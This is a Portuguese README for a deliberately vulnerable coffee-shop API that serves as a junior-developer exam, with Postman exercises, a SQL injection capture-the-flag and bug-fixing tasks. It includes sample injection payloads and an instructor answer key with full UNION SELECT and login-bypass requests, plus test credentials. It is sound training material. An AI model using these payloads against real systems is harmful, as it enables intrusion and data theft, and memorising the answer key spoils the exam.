# ☕ Grão & Código - API da Cafeteria

> **Projeto Educacional para Desenvolvedores Junior**
> 
> Uma API propositalmente vulnerável para treinamento em segurança, testes e debugging.

![Node.js](https://img.shields.io/badge/Node.js-18-green)
![Express](https://img.shields.io/badge/Express-4.18-blue)
![MySQL](https://img.shields.io/badge/MySQL-8.0-orange)
![Docker](https://img.shields.io/badge/Docker-Ready-blue)

---

## ⚠️ AVISO IMPORTANTE

Este projeto contém **vulnerabilidades propositais** para fins educacionais. 

**NÃO** utilize este código em produção!

As técnicas demonstradas aqui são **ilegais** quando aplicadas em sistemas sem autorização.

---

## 📋 Índice

1. [Sobre o Projeto](#-sobre-o-projeto)
2. [Estrutura da Prova](#-estrutura-da-prova)
3. [Como Executar](#-como-executar)
4. [Parte 1: Exploração com Postman](#-parte-1-exploração-com-postman)
5. [Parte 2: CTF - SQL Injection](#-parte-2-ctf---sql-injection)
6. [Parte 3: Correção de Bugs](#-parte-3-correção-de-bugs)
7. [Estrutura do Banco de Dados](#-estrutura-do-banco-de-dados)
8. [Gabarito (Apenas para Instrutores)](#-gabarito-apenas-para-instrutores)

---

## 📖 Sobre o Projeto

O **Grão & Código** é uma API fictícia para gestão de uma cafeteria gourmet. O sistema gerencia:

- **Produtos**: Cafés, grãos, doces e acessórios
- **Categorias**: Organização dos produtos
- **Usuários**: Funcionários e clientes
- **Pedidos**: Vendas e histórico

### Tecnologias Utilizadas

- **Backend**: Node.js + Express
- **Banco de Dados**: MySQL 8.0
- **Containerização**: Docker + Docker Compose
- **Documentação**: Esta que você está lendo! 😄

---

## 🎯 Estrutura da Prova

A prova está dividida em **3 momentos**:

### Momento 1: Caixa Preta (Exploração)
- Testar a API usando Postman
- Entender os endpoints sem ver o código
- Documentar comportamentos observados

### Momento 2: CTF - Capture The Flag
- Encontrar vulnerabilidades de SQL Injection
- Capturar as flags escondidas
- Total de **185 pontos** disponíveis

### Momento 3: Correção de Bugs
- Analisar o código fonte
- Identificar e corrigir bugs propositais
- **6 bugs** para encontrar e corrigir

---

## 🚀 Como Executar

### Pré-requisitos

- [Docker](https://www.docker.com/get-started) instalado
- [Docker Compose](https://docs.docker.com/compose/install/) instalado
- [Postman](https://www.postman.com/downloads/) ou similar

### Passo a Passo

1. **Clone ou acesse o projeto**
```bash
cd prova-jr
```

2. **Inicie os containers**
```bash
docker-compose up --build
```

3. **Aguarde a inicialização**
   - O MySQL demora alguns segundos para iniciar
   - A API conectará automaticamente quando o banco estiver pronto

4. **Acesse a API**
   - URL base: `http://localhost:3000`
   - Documentação: `http://localhost:3000/api/docs`

5. **Para parar os containers**
```bash
docker-compose down
```

6. **Para resetar o banco de dados**
```bash
docker-compose down -v
docker-compose up --build
```

---

## 🔍 Parte 1: Exploração com Postman

### Objetivo
Familiarizar-se com a API testando os endpoints disponíveis.

### Endpoints para Explorar

| Método | Endpoint | Descrição |
|--------|----------|-----------|
| GET | `/api/products` | Lista todos os produtos |
| GET | `/api/products/:id` | Busca produto por ID |
| GET | `/api/products?category=1` | Filtra por categoria |
| GET | `/api/categories` | Lista categorias |
| GET | `/api/categories/:id` | Categoria com produtos |
| GET | `/api/users` | Lista usuários |
| GET | `/api/orders` | Lista pedidos |
| GET | `/api/orders/:id` | Detalhes do pedido |
| POST | `/api/auth/login` | Realizar login |

### Exemplos de Requisições

#### Listar Produtos
```http
GET http://localhost:3000/api/products
```

#### Filtrar Produtos por Preço
```http
GET http://localhost:3000/api/products?minPrice=10&maxPrice=50
```

#### Fazer Login
```http
POST http://localhost:3000/api/auth/login
Content-Type: application/json

{
    "username": "barista_joao",
    "password": "cafezinho"
}
```

#### Criar Pedido
```http
POST http://localhost:3000/api/orders
Content-Type: application/json

{
    "user_id": 5,
    "items": [
        { "product_id": 1, "quantity": 2 },
        { "product_id": 13, "quantity": 1 }
    ],
    "notes": "Sem açúcar"
}
```

### Exercícios

1. Liste todos os produtos da categoria "Bebidas Quentes"
2. Encontre o produto mais caro
3. Faça login com diferentes usuários
4. Crie um novo pedido e verifique se foi criado corretamente
5. Atualize o status de um pedido para "preparing"

---

## 🚩 Parte 2: CTF - SQL Injection

### Objetivo
Encontrar as **4 flags** escondidas usando técnicas de SQL Injection.

### ⚠️ Rotas Vulneráveis

| Endpoint | Vulnerabilidade |
|----------|-----------------|
| GET `/api/vulnerable/search?q=` | Busca vulnerável |
| POST `/api/vulnerable/login` | Login vulnerável |
| GET `/api/vulnerable/product/:id` | ID vulnerável |
| GET `/api/vulnerable/users?role=` | Filtro vulnerável |

### Flags Disponíveis

| Flag | Pontos | Dificuldade |
|------|--------|-------------|
| `Flag{W3lc0m3_t0_SQL_W0rld}` | 10 | ⭐ Iniciante |
| `Flag{SQL_1nj3ct10n_M4st3r}` | 25 | ⭐⭐ Intermediário |
| `Flag{Un10n_S3l3ct_Pr0}` | 50 | ⭐⭐⭐ Avançado |
| `Flag{4dm1n_P4ssw0rd_L34k3d}` | 100 | ⭐⭐⭐⭐ Expert |

### Dicas Gerais

1. **Teste com aspas simples** (`'`) para ver erros SQL
2. **Use comentários SQL** (`--` ou `#`) para ignorar o resto da query
3. **UNION SELECT** permite combinar resultados de outras tabelas
4. **information_schema** contém metadados do banco

### Exemplos de Payloads (Spoiler Leve)

```
# Teste básico de SQL Injection
' OR '1'='1

# Ver erro SQL
'

# Comentar resto da query
admin' --

# UNION com número correto de colunas
' UNION SELECT 1,2,3,4,5,6,7,8,9 --
```

### Referência Rápida

Acesse `GET /api/vulnerable/flags` para ver os desafios disponíveis.

---

## 🐛 Parte 3: Correção de Bugs

### Objetivo
Identificar e corrigir os **6 bugs** no arquivo `src/routes/buggy.js`.

### Lista de Bugs

| # | Nome | Endpoint | Dificuldade |
|---|------|----------|-------------|
| 1 | Comparação de Tipos | GET `/api/buggy/products` | ⭐ Fácil |
| 2 | Cálculo Incorreto | GET `/api/buggy/total/:orderId` | ⭐ Fácil |
| 3 | Async/Await | POST `/api/buggy/order` | ⭐⭐ Médio |
| 4 | Off-by-One Error | GET `/api/buggy/ranking` | ⭐⭐ Médio |
| 5 | Validação de Entrada | POST `/api/buggy/discount` | ⭐ Fácil |
| 6 | Escopo de Variável | GET `/api/buggy/summary` | ⭐⭐ Médio |

### Como Testar

1. Acesse `GET /api/buggy` para ver a lista de bugs
2. Teste cada endpoint no Postman
3. Observe o comportamento incorreto
4. Abra o arquivo `src/routes/buggy.js`
5. Encontre o comentário `/* BUG #X */`
6. Corrija o bug
7. O hot-reload aplicará as mudanças automaticamente
8. Teste novamente

### Exemplos de Testes

#### Bug #1 - Comparação de Tipos
```http
GET http://localhost:3000/api/buggy/products
# Observe: produtos com stock=0 mostram "Em estoque"
```

#### Bug #2 - Cálculo Incorreto
```http
GET http://localhost:3000/api/buggy/total/1
# Observe: o total está concatenado, não somado
```

#### Bug #3 - Async/Await
```http
POST http://localhost:3000/api/buggy/order
Content-Type: application/json

{
    "user_id": 5,
    "items": [
        { "product_id": 1, "quantity": 2 }
    ]
}
# Observe: total sempre é 0
```

#### Bug #5 - Validação
```http
POST http://localhost:3000/api/buggy/discount
Content-Type: application/json

{
    "product_id": 1,
    "discount_percent": -50
}
# Observe: preço aumentou ao invés de diminuir!
```

---

## 🗄️ Estrutura do Banco de Dados

### Diagrama ER

```
┌─────────────┐       ┌─────────────┐
│  categories │       │   users     │
├─────────────┤       ├─────────────┤
│ id (PK)     │       │ id (PK)     │
│ name        │       │ username    │
│ description │       │ password    │
│ created_at  │       │ email       │
└──────┬──────┘       │ role        │
       │              │ active      │
       │              │ created_at  │
       │              └──────┬──────┘
       │                     │
       ▼                     ▼
┌─────────────┐       ┌─────────────┐
│  products   │       │   orders    │
├─────────────┤       ├─────────────┤
│ id (PK)     │       │ id (PK)     │
│ name        │       │ user_id(FK) │
│ description │       │ total       │
│ price       │       │ status      │
│ stock       │       │ notes       │
│ category_id │───────│ created_at  │
│ active      │       │ updated_at  │
│ created_at  │       └──────┬──────┘
│ updated_at  │              │
└──────┬──────┘              │
       │                     │
       │     ┌───────────────┘
       │     │
       ▼     ▼
┌─────────────────┐
│  order_items    │
├─────────────────┤
│ id (PK)         │
│ order_id (FK)   │
│ product_id (FK) │
│ quantity        │
│ unit_price      │
└─────────────────┘

┌─────────────────┐
│  secret_flags   │ (CTF)
├─────────────────┤
│ id (PK)         │
│ flag_code       │
│ flag_name       │
│ hint            │
│ points          │
└─────────────────┘
```

### Dados de Teste

- **5 categorias**: Bebidas Quentes, Bebidas Geladas, Grãos e Pós, Doces e Salgados, Acessórios
- **20 produtos**: Diversos itens de cafeteria
- **7 usuários**: admin, gerente, baristas, clientes
- **6 pedidos**: Histórico de vendas
- **4 flags**: Para o desafio CTF

### Usuários de Teste

| Username | Senha | Cargo |
|----------|-------|-------|
| admin | admin123 | Administrador |
| gerente_maria | maria2024 | Gerente |
| barista_joao | cafezinho | Barista |
| barista_ana | latte123 | Barista |
| cliente_carlos | carlos99 | Cliente |
| cliente_lucia | senha123 | Cliente |

---

## 📁 Estrutura do Projeto

```
prova-jr/
├── docker-compose.yml    # Configuração dos containers
├── Dockerfile            # Build da aplicação
├── package.json          # Dependências Node.js
├── README.md             # Esta documentação
│
├── docs/                 # Documentação adicional
│   ├── INSTRUCTOR.md     # Guia para instrutores
│   ├── POSTMAN.md        # Guia do Postman
│   └── SQL_INJECTION.md  # Referência SQL Injection
│
└── src/
    ├── server.js         # Servidor principal
    │
    ├── database/
    │   ├── connection.js # Conexão com MySQL
    │   └── init.sql      # Schema e seeds
    │
    └── routes/
        ├── products.js   # CRUD de produtos (seguro)
        ├── categories.js # CRUD de categorias (seguro)
        ├── users.js      # CRUD de usuários (seguro)
        ├── orders.js     # CRUD de pedidos (seguro)
        ├── auth.js       # Autenticação (seguro)
        ├── vulnerable.js # ⚠️ Rotas vulneráveis (CTF)
        └── buggy.js      # 🐛 Rotas com bugs
```

---

## 🔐 Gabarito (Apenas para Instrutores)

<details>
<summary>⚠️ SPOILERS - Clique para expandir</summary>

### Soluções do CTF

#### Flag 1 (10 pts) - Iniciante
```http
GET /api/vulnerable/search?q=' UNION SELECT flag_code,2,3,4,5,6,7,8,9 FROM secret_flags --
```

#### Flag 2 (25 pts) - Intermediário
```http
GET /api/vulnerable/users?role=' OR '1'='1
# A senha do usuário suporte_tech contém a flag
```

#### Flag 3 (50 pts) - Avançado
```http
GET /api/vulnerable/product/0 UNION SELECT 1,flag_code,flag_name,hint,points,6,7,8,9,10,11,12 FROM secret_flags WHERE points=50
```

#### Flag 4 (100 pts) - Expert
```http
POST /api/vulnerable/login
{
    "username": "admin' --",
    "password": "qualquer"
}
```

### Correções dos Bugs

#### Bug #1 - Comparação de Tipos
```javascript
// ERRADO
const inStock = product.stock == '0' ? false : true;

// CORRETO
const inStock = product.stock > 0;
```

#### Bug #2 - Cálculo Incorreto
```javascript
// ERRADO
let total = '0';

// CORRETO
let total = 0;
```

#### Bug #3 - Async/Await
```javascript
// ERRADO
items.forEach(async (item) => { ... });

// CORRETO
for (const item of items) {
    // ... código async
}
// ou
await Promise.all(items.map(async (item) => { ... }));
```

#### Bug #4 - Off-by-One
```javascript
// ERRADO
for (let i = 1; i <= products.length; i++)

// CORRETO
for (let i = 0; i < products.length; i++)
```

#### Bug #5 - Validação de Entrada
```javascript
// ADICIONAR VALIDAÇÃO
if (discount_percent < 0 || discount_percent > 100) {
    return res.status(400).json({
        success: false,
        error: 'Desconto deve ser entre 0 e 100%'
    });
}
```

#### Bug #6 - Escopo de Variável
```javascript
// ERRADO
var categoryTotal = 0; // fora do loop

// CORRETO
// Mover para dentro do loop:
const categoryTotal = parseFloat(result.total);
```

</details>

---

## 📞 Suporte

Em caso de dúvidas durante a prova:
- Consulte esta documentação
- Acesse `/api/docs` para referência rápida
- Pergunte ao instrutor

---

## 📄 Licença

Este projeto é para uso educacional interno.

**Criado para treinamento de desenvolvedores Junior.**

---

<div align="center">

☕ **Grão & Código** - Onde café e código se encontram!

</div>
